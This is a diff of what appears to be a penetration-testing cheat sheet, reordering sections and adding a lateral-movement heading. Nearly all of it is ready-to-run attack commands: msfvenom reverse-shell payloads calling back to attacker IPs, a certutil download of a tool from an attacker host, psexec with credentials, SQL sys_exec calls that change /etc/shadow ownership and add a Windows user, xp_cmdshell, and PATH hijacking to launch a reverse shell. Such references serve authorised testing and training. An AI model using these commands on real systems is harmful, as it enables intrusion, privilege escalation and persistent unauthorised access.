@@ -730,6 +730,13 @@ system("/bin/bash");
 ``` python, perl, asp, JavaScript, war```
 ``` js_le, (javascript, little endian)```
 
+#### msfvenom payloads
+``` 
+msfvenom -l payloads
+msfvenom -p java/jsp_shell_reverse_tcp --payload-options
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.25 LPORT=4444 -f war > runme.war
+```
+
 #### Webshells
 ``` /usr/share/webshells/```
 ``` Pikachu.gif.php```
@@ -743,6 +750,8 @@ http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 whereis netcat
 which nc
 ```
+
+# Lateral movement
 
 #### Windows Transfer
 ``` certutil.exe -urlcache -split -f "http://10.10.14.19/accesschk.exe" achk.exe```
@@ -770,12 +779,7 @@ psexec.py user:passwd@10.10.10.152 whoami
 psexec.py user:passwd@10.10.10.152 -c python <cmd>
 ```
 
-#### msfvenom payloads
-``` 
-msfvenom -l payloads
-msfvenom -p java/jsp_shell_reverse_tcp --payload-options
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.25 LPORT=4444 -f war > runme.war
-```
+
 
 # Useful file Locations
 #### Webshell locations:
@@ -842,6 +846,17 @@ exec "/bin/sh" (IRB)
 !sh (nmap)
 ```
 
+#### Execute OS Commands from within SQL
+
+```
+\! whoami
+sys_exec('chown john.john /etc/shadow')
+SELECT sys_exec("net users lecon lecon /add");
+MSSQL:
+EXEC xp_cmdshell 'dir *.exe';
+GO
+```
+
 # PATH Manipulation
 
 #### Custom code running other binaries - PATH manipulation:
@@ -857,18 +872,8 @@ export PATH=/tmp:$PATH
 #### Another trick is to create a reverse shell with msfvenom and place that in the set PATH
 ```msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.223 LPORT=555 -f elf -o shell```
 
-* * *
 
-#### Execute OS Commands from within SQL
 
-```
-\! whoami
-sys_exec('chown john.john /etc/shadow')
-SELECT sys_exec("net users lecon lecon /add");
-MSSQL:
-EXEC xp_cmdshell 'dir *.exe';
-GO
-```
 
 # If your stuck:
 #### Vector
